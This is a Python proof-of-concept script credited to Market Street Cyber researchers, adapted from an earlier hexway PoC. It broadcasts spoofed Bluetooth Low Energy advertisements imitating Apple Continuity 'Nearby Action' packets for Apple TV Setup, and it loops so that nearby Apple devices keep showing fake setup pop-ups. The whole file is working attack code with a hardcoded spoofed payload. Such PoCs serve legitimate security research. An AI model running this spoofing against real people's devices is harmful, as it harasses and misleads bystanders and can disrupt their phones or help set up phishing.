#!/usr/bin/env python3

# ------ Script Author(s) Info --------
# Author: Steven Hullander
# Twitter: https://twitter.com/TheSweatySteve

# Author: Zach Phillips
# Twitter: https://twitter.com/zach_phillips06


# ------ Original Author(s) Info --------
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway

import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

help_desc = '''
AppleTV Setup advertise spoofing PoC
developed by Steven Hullander and Zach Phillips from Market Street Cyber (MSC)

Original PoC credit
---chipik and hexway
'''

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
args = parser.parse_args()

dev_id = 0  # the bluetooth device is hci0
toggle_device(dev_id, True)

# Manufacturer Specifc data for Apple TV
#    ---> Length: 0x16
#    ---> Type: 0xff                                  (Manufacturer Specific)
#    ---> Company ID: 0x004c                          (Apple, Inc.)

# Apple Continuity Protocol
#    ---> Unknown: 0x04
#            Length: 0x04
#            Unknown Data: 0x2a 0x00 0x00 0x00
#    ---> Nearby Action
#            Tag: 0x0f                                (Nearby Action)
#            Length: 0x07
#            Action Flags: 0xc0
#            Action Type: 0x01                        (Apple TV Setup)
#            Auth Tag: 0x60 0x4c 0x95
#            Device: 0x0c                             (AppleTV)
#    ---> Nearby Info
#            Tag: 0x10                                (Nearby Info)
#            Length: 0x02
#            Activity Level: 0x01                     (Activity reporting is disabled)
#            Information: 0x00


data1= (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x07, 0xc0, 0x01, 0x60, 0x4c, 0x95, 0x0c, 0x07, 0x10, 0x02, 0x01, 0x00)

try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise

print("Start advertising...")
try:
    start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                             data=(data1))
    while True:
        sleep(2)
        #print("yup")
except:
    stop_le_advertising(sock)
    raise
